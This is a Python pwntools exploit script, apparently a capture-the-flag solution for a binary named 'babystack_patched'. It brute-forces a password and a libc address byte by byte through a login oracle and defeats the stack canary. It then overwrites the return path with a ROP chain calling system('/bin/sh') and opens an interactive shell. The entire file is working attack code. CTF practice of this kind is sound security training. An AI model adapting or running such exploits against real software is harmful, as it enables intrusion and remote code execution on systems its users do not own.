from os import system
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *__libc_start_main+238
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './babystack_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('./libc_64.so.6', checksec=False)

def auth(passwd,prev_respond):
    if prev_respond == True:
        p.sendafter(b'>> ',b'1')
    p.sendafter(b'>> ', b'1')
    p.sendafter(b'passowrd :',passwd)
    respond = p.recvuntil(b'!\n').decode()
    if respond == 'Failed !\n':
        return False
    else:
        return True

def magiccopy(data):
    p.sendafter(b'>> ',b'3')
    p.sendafter(b'Copy :',data)

password = b''
count = 0
respond = False
while True:
    for i in range(1,256):
        respond = auth(password+ p8(i) + b'\x00',respond)
        if respond == True:
            password += p8(i)
            count += 1
            break
        else:
            continue
    if count == 16:
        break

auth(password + b'\x00' + b'a'* ((8*9) - 1)  ,respond)
magiccopy(b'a'*63)

leak = b''
count = 0
while True:
    for i in range(1,256):
        respond = auth(b'a'*8*2 + b'1aaaaaaa' + leak  + p8(i) + b'\x00',respond)
        if respond == True:
            leak += p8(i)
            count += 1
            break
        else:
            continue
    if count == 6:
        break


leak = u64(leak.ljust(8,b'\x00'))
libc.address = leak - 0x6ffb4
pop_rdi = libc.address + 0x0000000000021102
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
log.info('libc.address: ' + hex(libc.address))

#write system
payload = int((b'a'*8*2 + b'\x00' + b'a'* ((8*11) - 1) + b'a' *8 *2 + p64(system)).hex(),16)>>8
payload = bytes.fromhex(hex(payload)[2:])
auth(payload ,respond)
magiccopy(b'a'*63)
# write binsh
payload = b'a'*8*2 + b'\x00' + b'a'* ((8*11)) + b'a' *8 *1 + p64(binsh)
auth(payload ,respond)
magiccopy(b'a'*63)
payload = b'a'*8*2 + b'\x00' + b'a'* ((8*11)-1) + b'a' *8 *1 + p64(binsh)
auth(payload ,respond)
magiccopy(b'a'*63)
# write pop_rdi
payload = b'a'*8*2 + b'\x00' + b'a'* ((8*11)) + p64(pop_rdi)
auth(payload ,respond)
magiccopy(b'a'*63)
payload = b'a'*8*2 + b'\x00' + b'a'* ((8*11)-1) + p64(pop_rdi)
auth(payload ,respond)
magiccopy(b'a'*63)
# write password to stack to bypass canary check
payload = b'a'*8*2 + b'\x00' + b'a'* ((8*6)-1) + password
auth(payload ,respond)
magiccopy(b'a'*63)





p.interactive()
